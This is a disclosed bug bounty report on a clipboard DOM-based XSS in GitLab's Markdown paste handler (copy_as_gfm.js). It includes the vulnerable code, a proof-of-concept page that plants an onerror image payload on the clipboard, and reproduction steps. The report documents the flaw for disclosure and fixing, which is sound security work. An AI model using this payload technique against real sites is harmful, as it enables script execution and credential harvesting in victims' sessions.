# Clipboard DOM-based XSS

## Report Details
- **Report ID**: 1196958
- **URL**: https://hackerone.com/reports/1196958
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-05-14T03:39:36.225Z
- **Disclosed**: 2021-08-19T14:15:13.153Z

## Reporter
- **Username**: vovohelo
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

A clipboard DOM-based XSS exists on several Markdown text fields. 

### Technical details

The *app/assets/javascripts/behaviors/markdown/copy_as_gfm.js* file is used to get and set GFM (GitHub Flavored Markdown) data on the clipboard on different parts of the GitLab application. If a user copies data from a malicious website and copies it in one of the text fields in which the **pasteGFM** function is used, the attacker can execute arbitrary JavaScript code under the user's credentials. The vulnerability exists because the **gfmHtml** variable value is assigned without sanitization directly from the clipboard and later used to set the **innerHTML** property of a dynamically created *div* element. The following code snippet contains the vulnerable code with additional comments for better explaining the issue.

```js
  static pasteGFM(e) {
    const { clipboardData } = e.originalEvent;
    if (!clipboardData) return;

    const text = clipboardData.getData('text/plain');
    const gfm = clipboardData.getData('text/x-gfm');
    const gfmHtml = clipboardData.getData('text/x-gfm-html'); /* <-- Data is copied from the clipboard*/
    if (!gfm && !gfmHtml) return;

    e.preventDefault();

    // We have the original selection already converted to gfm
    if (gfm) {
      CopyAsGFM.insertPastedText(e.target, text, gfm);
    } else {
      // Due to the async copy call we are not able to produce gfm so we transform the cached HTML
      const div = document.createElement('div'); /* <-- Div element is created*/
      div.innerHTML = gfmHtml; /* <-- innerHTML is set */
      CopyAsGFM.nodeToGFM(div)
        .then((transformedGfm) => {
          CopyAsGFM.insertPastedText(e.target, text, transformedGfm);
        })
        .catch(() => {});
    }
  }
```

### Steps to reproduce
On a testing machine, perform the following steps:

1. Install the Docker container engine
1. Create an HTML file like the following:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clipboard-XSS</title>
</head>
<body>
    <h3>Try out our new clipboard plugin</h3>
    <p>Copy <strong>here</strong>, paste it on the editor and see what happens!</p>
    <script>
        document.oncopy = event => {
            event.preventDefault();
            event.clipboardData.setData('text/x-gfm-html', 'XSS<img/src/onerror=alert(1)>');
            console.log("updated clipboard");
        }
    </script>
</body>
</html>
```
2. Spin a new GitLab container with the following commands:
```bash
export GITLAB_HOME=/srv/gitlab
sudo docker run --detach   --hostname gitlab.example.com   --publish 4443:443 --publish 8080:80 --publish 2222:22   --name gitlab   --restart always   --volume $GITLAB_HOME/config:/etc/gitlab   --volume $GITLAB_HOME/logs:/var/log/gitlab   --volume $GITLAB_HOME/data:/var/opt/gitlab   gitlab/gitlab-ce:latest
```
3. Using a web browser, navigate to the HTML file created in step 1
4. Select the word **here** as instructed and copy it to the clipboard
5. Navigate to http://localhost:8080/ and follow the instructions required to set up the password for the root user
6. Using the previously set password, log in as the root user
7. On the projects list, click on the **GitLab Instance / Monitoring** project
8. On the left pane, click on **Issues**
9. Click on the **New issue** button
10. Paste the contents from the clipboard on the Description textarea
11. Check an alert box is displayed

### Impact

This is a standard XSS vulnerability. An attacker may force users to perform any activities available through the application's Javascript API or use this for credential harvesting, etc.

### Examples

The following PoC video demonstrates the attack
{F1300761}


### What is the current *bug* behavior?

Pasting content triggers arbitrary JavaScript code execution when the **text/x-gfm-html** MIME type is used.

### What is the expected *correct* behavior?

Pasting content should not trigger JavaScript code execution.

### Relevant logs and/or screenshots

(Paste any relevant logs - please use code blocks (```) to format console output,
logs, and code as it's very hard to read otherwise.)

### Output of checks

This bug exists in https://gitlab.com/ but is currently unexploitable due to CSP.

#### Results of GitLab environment info

```
System information
System:		
Current User:	git
Using RVM:	no
Ruby Version:	2.7.2p137
Gem Version:	3.1.4
Bundler Version:2.1.4
Rake Version:	13.0.3
Redis Version:	6.0.12
Git Version:	2.31.1
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.11.3
Revision:	b321336e443
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.6
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	13.17.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

This is a standard XSS vulnerability. An attacker may force users to perform any activities available through the application's Javascript API or use this for credential harvesting, etc.

## Attachments
- GitLab-Issues-Clipboard-XSS-2021-05-13_21-58.mp4
